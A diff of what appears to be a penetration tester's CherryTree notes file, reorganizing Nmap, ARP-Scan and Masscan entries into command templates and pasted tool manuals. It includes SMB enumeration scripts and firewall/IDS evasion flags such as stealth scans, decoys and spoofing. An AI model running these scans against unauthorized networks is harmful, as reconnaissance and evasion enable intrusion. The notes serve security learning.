@@ -632,163 +632,21 @@ execute a module:
 </rich_text>
       </node>
     </node>
-    <node name="NMAP" unique_id="2" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694980362" ts_lastsave="1697102246">
+    <node name="NMAP" unique_id="2" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694980362" ts_lastsave="1700046220">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Usage: nmap [Scan Type(s)] [Options] {target specification}
-
-TARGET SPECIFICATION:
-</rich_text>
-      <rich_text indent="1">  Can pass hostnames, IP addresses, networks, etc.
-  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
-  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
-  -iR &lt;num hosts&gt;: Choose random targets
-  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
-  --excludefile &lt;exclude_file&gt;: Exclude list from file</rich_text>
+sudo nmap -sC -sV -Pn -p 0-10000 </rich_text>
+      <rich_text weight="heavy">IP</rich_text>
       <rich_text>
 
-HOST DISCOVERY:
+smb enum:
 </rich_text>
-      <rich_text indent="1">  -sL: List Scan - simply list targets to scan
-  -sn: Ping Scan - disable port scan
-  -Pn: Treat all hosts as online -- skip host discovery
-  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-  -PO[protocol list]: IP Protocol Ping
-  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
-  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
-  --system-dns: Use OS's DNS resolver
-  --traceroute: Trace hop path to each host</rich_text>
+      <rich_text indent="1">nmap -p </rich_text>
+      <rich_text indent="1" weight="heavy">PORT</rich_text>
+      <rich_text indent="1"> --script=smb-enum-shares.nse,smb-enum-users.nse </rich_text>
+      <rich_text weight="heavy">IP</rich_text>
       <rich_text>
 
-SCAN TECHNIQUES:
 </rich_text>
-      <rich_text indent="1">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-  -sU: UDP Scan
-  -sN/sF/sX: TCP Null, FIN, and Xmas scans
-  --scanflags &lt;flags&gt;: Customize TCP scan flags
-  -sI &lt;zombie host[:probeport]&gt;: Idle scan
-  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
-  -sO: IP protocol scan
-  -b &lt;FTP relay host&gt;: FTP bounce scan</rich_text>
-      <rich_text>
-
-PORT SPECIFICATION AND SCAN ORDER:
-</rich_text>
-      <rich_text indent="1">  -p &lt;port ranges&gt;: Only scan specified ports
-    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
-  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
-  -F: Fast mode - Scan fewer ports than the default scan
-  -r: Scan ports sequentially - don't randomize
-  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
-  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</rich_text>
-      <rich_text>
-
-SERVICE/VERSION DETECTION:
-</rich_text>
-      <rich_text indent="1">  -sV: Probe open ports to determine service/version info
-  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
-  --version-light: Limit to most likely probes (intensity 2)
-  --version-all: Try every single probe (intensity 9)
-  --version-trace: Show detailed version scan activity (for debugging)</rich_text>
-      <rich_text>
-
-SCRIPT SCAN:
-</rich_text>
-      <rich_text indent="1">  -sC: equivalent to --script=default
-  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
-           directories, script-files or script-categories
-  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
-  --script-args-file=filename: provide NSE script args in a file
-  --script-trace: Show all data sent and received
-  --script-updatedb: Update the script database.
-  --script-help=&lt;Lua scripts&gt;: Show help about scripts.
-           &lt;Lua scripts&gt; is a comma-separated list of script-files or
-           script-categories.</rich_text>
-      <rich_text>
-
-OS DETECTION:
-</rich_text>
-      <rich_text indent="1">  -O: Enable OS detection
-  --osscan-limit: Limit OS detection to promising targets
-  --osscan-guess: Guess OS more aggressively</rich_text>
-      <rich_text>
-
-TIMING AND PERFORMANCE:
-</rich_text>
-      <rich_text indent="1">  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
-  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
-  -T&lt;0-5&gt;: Set timing template (higher is faster)
-  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
-  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
-  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies
-      probe round trip time.
-  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
-  --host-timeout &lt;time&gt;: Give up on target after this long
-  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
-  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
-  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</rich_text>
-      <rich_text>
-
-FIREWALL/IDS EVASION AND SPOOFING:
-</rich_text>
-      <rich_text indent="1">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
-  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
-  -S &lt;IP_Address&gt;: Spoof source address
-  -e &lt;iface&gt;: Use specified interface
-  -g/--source-port &lt;portnum&gt;: Use given port number
-  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
-  --data &lt;hex string&gt;: Append a custom payload to sent packets
-  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
-  --data-length &lt;num&gt;: Append random data to sent packets
-  --ip-options &lt;options&gt;: Send packets with specified ip options
-  --ttl &lt;val&gt;: Set IP time-to-live field
-  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
-  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</rich_text>
-      <rich_text>
-
-OUTPUT:
-</rich_text>
-      <rich_text indent="1">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
-     and Grepable format, respectively, to the given filename.
-  -oA &lt;basename&gt;: Output in the three major formats at once
-  -v: Increase verbosity level (use -vv or more for greater effect)
-  -d: Increase debugging level (use -dd or more for greater effect)
-  --reason: Display the reason a port is in a particular state
-  --open: Only show open (or possibly open) ports
-  --packet-trace: Show all packets sent and received
-  --iflist: Print host interfaces and routes (for debugging)
-  --append-output: Append to rather than clobber specified output files
-  --resume &lt;filename&gt;: Resume an aborted scan
-  --noninteractive: Disable runtime interactions via keyboard
-  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
-  --webxml: Reference stylesheet from Nmap.Org for more portable XML
-  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</rich_text>
-      <rich_text>
-
-MISC:
-</rich_text>
-      <rich_text indent="1">  -6: Enable IPv6 scanning
-  -A: Enable OS detection, version detection, script scanning, and traceroute
-  --datadir &lt;dirname&gt;: Specify custom Nmap data file location
-  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
-  --privileged: Assume that the user is fully privileged
-  --unprivileged: Assume the user lacks raw socket privileges
-  -V: Print version number
-  -h: Print this help summary page.</rich_text>
-      <rich_text>
-
-EXAMPLES:
-</rich_text>
-      <rich_text indent="1">  nmap -v -A scanme.nmap.org
-  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
-  nmap -v -iR 10000 -Pn -p 80</rich_text>
-      <rich_text>
-
-SEE THE MAN PAGE (</rich_text>
-      <rich_text link="webs https://nmap.org/book/man.html">https://nmap.org/book/man.html</rich_text>
-      <rich_text>) FOR MORE OPTIONS AND EXAMPLES
-
-Nmap 7.94 ( https://nmap.org )</rich_text>
       <node name="Host discovery" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1694980811" ts_lastsave="1697102484">
         <rich_text style="italic">see also masscan -&gt; more aggressive -&gt; faster</rich_text>
         <rich_text>
@@ -899,7 +757,7 @@ ACK ping (RST means live host)
 
 </rich_text>
       </node>
-      <node name="Services &amp; Ports" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242135" ts_lastsave="1697986215">
+      <node name="Services &amp; Ports" unique_id="25" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695242135" ts_lastsave="1699971757">
         <rich_text>Multiple Targets:
 </rich_text>
         <rich_text indent="1">10.11.12.15-20
@@ -945,26 +803,13 @@ specify ports:
         <rich_text indent="2">x,x,x-x,x-x</rich_text>
         <rich_text>
 
-
 -</rich_text>
         <rich_text indent="1">O: Enable OS detection</rich_text>
         <rich_text>
 
 -T&lt;0-5&gt;: Set timing template (higher is faster)
 
--sU: SUDO, UDP scan, very slow , best use with --top-ports </rich_text>
-        <rich_text weight="heavy">NR</rich_text>
-        <rich_text>
 
--sT: TCP scan, full 3-way handshake
-
--sS: SUDO, SYN scan, A bit more stealthy, no full 3-way handshake &lt;-SYN/ACK -&gt; RST
-
--sN: SUDO, NULL scan,  more stealthy, no flag, open/filtered ports &lt;- RST 
-
--sF: SUDO, FIN scan,  more stealthy, FIN flag, open/filtered ports &lt;- RST
-
--sX: SUDO, XMAS scan,  more stealthy, PSH &amp; URG&amp; FIN flag, open/filtered ports &lt;- RST
 
 
 
@@ -1025,9 +870,24 @@ Add missing script:
         <rich_text>=</rich_text>
         <rich_text weight="heavy">VALUE</rich_text>
       </node>
-      <node name="Evasion" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1696528645" ts_lastsave="1696529072">
+      <node name="Evasion" unique_id="49" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1696528645" ts_lastsave="1699971770">
         <rich_text link="webs https://nmap.org/book/man-bypass-firewalls-ids.html">https://nmap.org/book/man-bypass-firewalls-ids.html</rich_text>
         <rich_text> 
+
+-sU: SUDO, UDP scan, very slow , best use with --top-ports </rich_text>
+        <rich_text weight="heavy">NR</rich_text>
+        <rich_text>
+
+-sT: TCP scan, full 3-way handshake
+
+-sS: SUDO, SYN scan, A bit more stealthy, no full 3-way handshake &lt;-SYN/ACK -&gt; RST
+
+-sN: SUDO, NULL scan,  more stealthy, no flag, open/filtered ports &lt;- RST 
+
+-sF: SUDO, FIN scan,  more stealthy, FIN flag, open/filtered ports &lt;- RST
+
+-sX: SUDO, XMAS scan,  more stealthy, PSH &amp; URG&amp; FIN flag, open/filtered ports &lt;- RST
+
 
 -Pn: no checking if host is alive (ping)
 
@@ -1043,10 +903,191 @@ Add missing script:
 
 --badsum: to detect if FW is present &lt;- replies from FW</rich_text>
       </node>
+      <node name="Manual" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1699958063" ts_lastsave="1700046249">
+        <rich_text>Usage: nmap [Scan Type(s)] [Options] {target specification}
+
+TARGET SPECIFICATION:
+</rich_text>
+        <rich_text indent="1">  Can pass hostnames, IP addresses, networks, etc.
+  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
+  -iL &lt;inputfilename&gt;: Input from list of hosts/networks
+  -iR &lt;num hosts&gt;: Choose random targets
+  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks
+  --excludefile &lt;exclude_file&gt;: Exclude list from file</rich_text>
+        <rich_text>
+
+HOST DISCOVERY:
+</rich_text>
+        <rich_text indent="1">  -sL: List Scan - simply list targets to scan
+  -sn: Ping Scan - disable port scan
+  -Pn: Treat all hosts as online -- skip host discovery
+  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
+  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
+  -PO[protocol list]: IP Protocol Ping
+  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
+  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers
+  --system-dns: Use OS's DNS resolver
+  --traceroute: Trace hop path to each host</rich_text>
+        <rich_text>
+
+SCAN TECHNIQUES:
+</rich_text>
+        <rich_text indent="1">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
+  -sU: UDP Scan
+  -sN/sF/sX: TCP Null, FIN, and Xmas scans
+  --scanflags &lt;flags&gt;: Customize TCP scan flags
+  -sI &lt;zombie host[:probeport]&gt;: Idle scan
+  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
+  -sO: IP protocol scan
+  -b &lt;FTP relay host&gt;: FTP bounce scan</rich_text>
+        <rich_text>
+
+PORT SPECIFICATION AND SCAN ORDER:
+</rich_text>
+        <rich_text indent="1">  -p &lt;port ranges&gt;: Only scan specified ports
+    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
+  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning
+  -F: Fast mode - Scan fewer ports than the default scan
+  -r: Scan ports sequentially - don't randomize
+  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports
+  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</rich_text>
+        <rich_text>
+
+SERVICE/VERSION DETECTION:
+</rich_text>
+        <rich_text indent="1">  -sV: Probe open ports to determine service/version info
+  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)
+  --version-light: Limit to most likely probes (intensity 2)
+  --version-all: Try every single probe (intensity 9)
+  --version-trace: Show detailed version scan activity (for debugging)</rich_text>
+        <rich_text>
+
+SCRIPT SCAN:
+</rich_text>
+        <rich_text indent="1">  -sC: equivalent to --script=default
+  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of
+           directories, script-files or script-categories
+  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts
+  --script-args-file=filename: provide NSE script args in a file
+  --script-trace: Show all data sent and received
+  --script-updatedb: Update the script database.
+  --script-help=&lt;Lua scripts&gt;: Show help about scripts.
+           &lt;Lua scripts&gt; is a comma-separated list of script-files or
+           script-categories.</rich_text>
+        <rich_text>
+
+OS DETECTION:
+</rich_text>
+        <rich_text indent="1">  -O: Enable OS detection
+  --osscan-limit: Limit OS detection to promising targets
+  --osscan-guess: Guess OS more aggressively</rich_text>
+        <rich_text>
+
+TIMING AND PERFORMANCE:
+</rich_text>
+        <rich_text indent="1">  Options which take &lt;time&gt; are in seconds, or append 'ms' (milliseconds),
+  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
+  -T&lt;0-5&gt;: Set timing template (higher is faster)
+  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes
+  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization
+  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies
+      probe round trip time.
+  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.
+  --host-timeout &lt;time&gt;: Give up on target after this long
+  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes
+  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second
+  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</rich_text>
+        <rich_text>
+
+FIREWALL/IDS EVASION AND SPOOFING:
+</rich_text>
+        <rich_text indent="1">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)
+  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys
+  -S &lt;IP_Address&gt;: Spoof source address
+  -e &lt;iface&gt;: Use specified interface
+  -g/--source-port &lt;portnum&gt;: Use given port number
+  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies
+  --data &lt;hex string&gt;: Append a custom payload to sent packets
+  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets
+  --data-length &lt;num&gt;: Append random data to sent packets
+  --ip-options &lt;options&gt;: Send packets with specified ip options
+  --ttl &lt;val&gt;: Set IP time-to-live field
+  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address
+  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</rich_text>
+        <rich_text>
+
+OUTPUT:
+</rich_text>
+        <rich_text indent="1">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan in normal, XML, s|&lt;rIpt kIddi3,
+     and Grepable format, respectively, to the given filename.
+  -oA &lt;basename&gt;: Output in the three major formats at once
+  -v: Increase verbosity level (use -vv or more for greater effect)
+  -d: Increase debugging level (use -dd or more for greater effect)
+  --reason: Display the reason a port is in a particular state
+  --open: Only show open (or possibly open) ports
+  --packet-trace: Show all packets sent and received
+  --iflist: Print host interfaces and routes (for debugging)
+  --append-output: Append to rather than clobber specified output files
+  --resume &lt;filename&gt;: Resume an aborted scan
+  --noninteractive: Disable runtime interactions via keyboard
+  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML
+  --webxml: Reference stylesheet from Nmap.Org for more portable XML
+  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</rich_text>
+        <rich_text>
+
+MISC:
+</rich_text>
+        <rich_text indent="1">  -6: Enable IPv6 scanning
+  -A: Enable OS detection, version detection, script scanning, and traceroute
+  --datadir &lt;dirname&gt;: Specify custom Nmap data file location
+  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
+  --privileged: Assume that the user is fully privileged
+  --unprivileged: Assume the user lacks raw socket privileges
+  -V: Print version number
+  -h: Print this help summary page.</rich_text>
+        <rich_text>
+
+EXAMPLES:
+</rich_text>
+        <rich_text indent="1">  nmap -v -A scanme.nmap.org
+  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
+  nmap -v -iR 10000 -Pn -p 80</rich_text>
+        <rich_text>
+
+SEE THE MAN PAGE (</rich_text>
+        <rich_text link="webs https://nmap.org/book/man.html">https://nmap.org/book/man.html</rich_text>
+        <rich_text>) FOR MORE OPTIONS AND EXAMPLES
+
+Nmap 7.94 ( https://nmap.org )</rich_text>
+      </node>
     </node>
-    <node name="ARP-Scan" unique_id="23" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1697102247">
+    <node name="ARP-Scan" unique_id="23" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1700046276">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Usage: arp-scan [options] [hosts...]
+Scan local network
+</rich_text>
+      <rich_text indent="1">sudo arp-scan -l</rich_text>
+      <rich_text>
+
+Specify interface
+</rich_text>
+      <rich_text indent="1">sudo arp-scan -I </rich_text>
+      <rich_text indent="1" weight="heavy">eth0</rich_text>
+      <rich_text indent="1"> -l</rich_text>
+      <rich_text>
+
+Scan target network
+</rich_text>
+      <rich_text indent="1">arp-scan </rich_text>
+      <rich_text indent="1" weight="heavy">IP</rich_text>
+      <rich_text indent="1">/</rich_text>
+      <rich_text indent="1" weight="heavy">MASK</rich_text>
+      <rich_text>
+
+
+
+</rich_text>
+      <node name="Manual" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1700046286">
+        <rich_text>Usage: arp-scan [options] [hosts...]
 
 Target hosts must be specified on the command line unless the --file or --localnet option is used.
 
@@ -1054,13 +1095,13 @@ arp-scan uses raw sockets, which requires privileges on some systems:
 
 Linux with POSIX.1e capabilities support using libcap:
 </rich_text>
-      <rich_text indent="1">       arp-scan is capabilities aware. It requires CAP_NET_RAW in the permitted
+        <rich_text indent="1">       arp-scan is capabilities aware. It requires CAP_NET_RAW in the permitted
        set and only enables that capability for the required functions.</rich_text>
-      <rich_text>
+        <rich_text>
 BSD and macOS:
 </rich_text>
-      <rich_text indent="1">       You need read/write access to /dev/bpf*</rich_text>
-      <rich_text>
+        <rich_text indent="1">       You need read/write access to /dev/bpf*</rich_text>
+        <rich_text>
 Any operating system:
        Running as root or SUID root will work on any OS but other methods
        are preferable where possible.
@@ -1074,19 +1115,19 @@ Options:
 The data type for option arguments is shown by a letter in angle brackets: 
 
 </rich_text>
-      <rich_text indent="1">&lt;s&gt; Character string.
+        <rich_text indent="1">&lt;s&gt; Character string.
 &lt;i&gt; Decimal integer, or hex if preceeded by 0x e.g. 2048 or 0x800.
 &lt;f&gt; Floating point decimal number.
 &lt;m&gt; MAC address, e.g. 01:23:45:67:89:ab or 01-23-45-67-89-ab (case insensitive)
 &lt;a&gt; IPv4 address e.g. 10.0.0.1
 &lt;h&gt; Hex encoded binary data. No leading 0x. (case insensitive).
 &lt;x&gt; Something else - see option description.</rich_text>
-      <rich_text>
+        <rich_text>
 
 General Options:
 
 </rich_text>
-      <rich_text indent="1">--help or -h		Display this usage message and exit.
+        <rich_text indent="1">--help or -h		Display this usage message and exit.
 
 --verbose or -v		Display verbose progress messages.
 			Can be used than once to increase verbosity. Max=3.
@@ -1099,12 +1140,12 @@ General Options:
 			If this option is not specified, arp-scan will search
 			the system interface list for the lowest numbered,
 			configured up interface (excluding loopback).</rich_text>
-      <rich_text>
+        <rich_text>
 
 Host Selection:
 
 </rich_text>
-      <rich_text indent="1">--file=&lt;s&gt; or -f &lt;s&gt;	Read hostnames or addresses from the specified file
+        <rich_text indent="1">--file=&lt;s&gt; or -f &lt;s&gt;	Read hostnames or addresses from the specified file
 			One name or address pattern per line. Use "-" for stdin.
 
 --localnet or -l	Generate addresses from interface configuration.
@@ -1112,12 +1153,12 @@ Host Selection:
 			(network and broadcast included). You cannot use the
 			--file option or give targets on the command line.
 			Use --interface to specify the interface.</rich_text>
-      <rich_text>
+        <rich_text>
 
 MAC/Vendor Mapping Files:
 
 </rich_text>
-      <rich_text indent="1">--ouifile=&lt;s&gt; or -O &lt;s&gt;	Use IEEE registry vendor mapping file &lt;s&gt;.
+        <rich_text indent="1">--ouifile=&lt;s&gt; or -O &lt;s&gt;	Use IEEE registry vendor mapping file &lt;s&gt;.
 			Default is ieee-oui.txt in the current directory. If
 			that is not found /usr/share/arp-scan/ieee-oui.txt
 			is used.
@@ -1126,12 +1167,12 @@ MAC/Vendor Mapping Files:
 			Default is mac-vendor.txt in the current directory.
 			If that is not found
 			/etc/arp-scan/mac-vendor.txt is used.</rich_text>
-      <rich_text>
+        <rich_text>
 
 Output Format Control:
 
 </rich_text>
-      <rich_text indent="1">--quiet or -q		Display minimal output for each responding host.
+        <rich_text indent="1">--quiet or -q		Display minimal output for each responding host.
 			Only the IP address and MAC address are displayed.
 			Reduces memory usage by about 5MB because the
 			vendor mapping files are not used. Only the ${ip}
@@ -1188,21 +1229,21 @@ Output Format Control:
 			quotes' to protect special characters from the shell.
 			
 			Example: --format='${ip}\t${mac}\t${vendor}'</rich_text>
-      <rich_text>
+        <rich_text>
 
 Host List Randomisation:
 
 </rich_text>
-      <rich_text indent="1">--random or -R		Randomise the target host list.
+        <rich_text indent="1">--random or -R		Randomise the target host list.
 
 --randomseed=&lt;i&gt;	Seed the pseudo random number generator.
 			Useful if you want a reproducible --random order.</rich_text>
-      <rich_text>
+        <rich_text>
 
 Output Timing and Retry:
 
 </rich_text>
-      <rich_text indent="1">--retry=&lt;i&gt; or -r &lt;i&gt;	Set total number of attempts per host to &lt;i&gt;,
+        <rich_text indent="1">--retry=&lt;i&gt; or -r &lt;i&gt;	Set total number of attempts per host to &lt;i&gt;,
 			default=2.
 
 --backoff=&lt;f&gt; or -b &lt;f&gt;	Set backoff factor to &lt;f&gt;, default=1.50.
@@ -1224,24 +1265,24 @@ Output Timing and Retry:
 			The value is in bits per second. Append K for
 			kilobits or M for megabits (decimal multiples). You
 			cannot specify both --interval and --bandwidth.</rich_text>
-      <rich_text>
+        <rich_text>
 
 DNS Resolution:
 
 </rich_text>
-      <rich_text indent="1">--numeric or -N		Targets must be IP addresses, not hostnames.
+        <rich_text indent="1">--numeric or -N		Targets must be IP addresses, not hostnames.
 			Can reduce startup time for large target lists.
 
 --resolve or -d		Resolve responding addresses to hostnames.
 			The default output format will display the hostname
 			instead of the IPv4 address. This option makes the
 			${name} field available for the --format option.</rich_text>
-      <rich_text>
+        <rich_text>
 
 Output ARP Packet:
 
 </rich_text>
-      <rich_text indent="1">--arpsha=&lt;m&gt; or -u &lt;m&gt;	Set the ARP source Ethernet address.
+        <rich_text indent="1">--arpsha=&lt;m&gt; or -u &lt;m&gt;	Set the ARP source Ethernet address.
 			Sets the 48-bit ar$sha field but does not change the
 			hardware address in the frame header, see --srcaddr
 			for how to change that address. Default is the
@@ -1283,12 +1324,12 @@ Output ARP Packet:
 			is within the network of the receiving interface.
 			Setting ar$spa to the destination IP address can cause
 			some operating systems to report an address clash.</rich_text>
-      <rich_text>
+        <rich_text>
 
 Output Ethernet Header:
 
 </rich_text>
-      <rich_text indent="1">--srcaddr=&lt;m&gt; or -S &lt;m&gt; Set the source Ethernet MAC address.
+        <rich_text indent="1">--srcaddr=&lt;m&gt; or -S &lt;m&gt; Set the source Ethernet MAC address.
 			Default is the interface MAC address. This sets the
 			address in the Ethernet header. It does not change the
 			address in the ARP packet: use --arpsha to change
@@ -1314,12 +1355,12 @@ Output Ethernet Header:
 			The id should be in the range 0 to 4095. arp-scan will
 			decode and display ARP responses in 802.1Q format
 			irrespective of this option.</rich_text>
-      <rich_text>
+        <rich_text>
 
 Misc Options:
 
 </rich_text>
-      <rich_text indent="1">--limit=&lt;i&gt; or -M &lt;i&gt;	Exit after the specified number of hosts have responded.
+        <rich_text indent="1">--limit=&lt;i&gt; or -M &lt;i&gt;	Exit after the specified number of hosts have responded.
 			arp-scan will exit with status 1 if the number of
 			responding hosts is less than the limit. Can be used
 			in scripts to check if fewer hosts respond without
@@ -1342,63 +1383,72 @@ Misc Options:
 --padding=&lt;h&gt; or -A &lt;h&gt;	Specify padding after packet data.
 			Set padding after the ARP request to hex value &lt;h&gt;.
 </rich_text>
-      <rich_text>
+        <rich_text>
 Report bugs or send suggestions at https://github.com/royhills/arp-scan
 See the arp-scan homepage at https://github.com/royhills/arp-scan
 </rich_text>
-      <node name="Commands" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695240625" ts_lastsave="1697102591">
-        <rich_text>Scan local network
-</rich_text>
-        <rich_text indent="1">sudo arp-scan -l</rich_text>
-        <rich_text>
-
-Specify interface
-</rich_text>
-        <rich_text indent="1">sudo arp-scan -I </rich_text>
-        <rich_text indent="1" weight="heavy">eth0</rich_text>
-        <rich_text indent="1"> -l</rich_text>
-        <rich_text>
-
-Scan target network
-</rich_text>
-        <rich_text indent="1">arp-scan </rich_text>
-        <rich_text indent="1" weight="heavy">IP</rich_text>
-        <rich_text indent="1">/</rich_text>
-        <rich_text indent="1" weight="heavy">MASK</rich_text>
-        <rich_text>
-
-
-
-
-
-
-
-</rich_text>
       </node>
     </node>
-    <node name="Masscan" unique_id="27" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1697102249">
+    <node name="Masscan" unique_id="27" prog_lang="custom-colors" tags="Port Scan OS Service" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695242334" ts_lastsave="1700046311">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-MASSCAN is a fast port scanner. The primary input parameters are the IP addresses/ranges you want to scan, and the port numbers.
+scan some ports at specified kpps
+</rich_text>
+      <rich_text indent="1">masscan -p</rich_text>
+      <rich_text indent="1" weight="heavy">PORTS</rich_text>
+      <rich_text indent="1">  </rich_text>
+      <rich_text indent="1" weight="heavy">TARGET</rich_text>
+      <rich_text indent="1"> --rate=</rich_text>
+      <rich_text indent="1" weight="heavy">RATE</rich_text>
+      <rich_text indent="1">
+
+</rich_text>
+      <rich_text> list  options that are compatible with nmap</rich_text>
+      <rich_text indent="1">
+masscan --nmap
+
+</rich_text>
+      <rich_text> save results of scan in binary format</rich_text>
+      <rich_text indent="1">
+masscan -p</rich_text>
+      <rich_text indent="1" weight="heavy">PORTS</rich_text>
+      <rich_text indent="1">  </rich_text>
+      <rich_text indent="1" weight="heavy">TARGET</rich_text>
+      <rich_text indent="1"> --banners -oB </rich_text>
+      <rich_text indent="1" weight="heavy">FILE</rich_text>
+      <rich_text indent="1">
+
+</rich_text>
+      <rich_text> read binary scan results in a file and save them as xml
+</rich_text>
+      <rich_text indent="1"> masscan --open --banners --readscan </rich_text>
+      <rich_text indent="1" weight="heavy">BIN_FILE </rich_text>
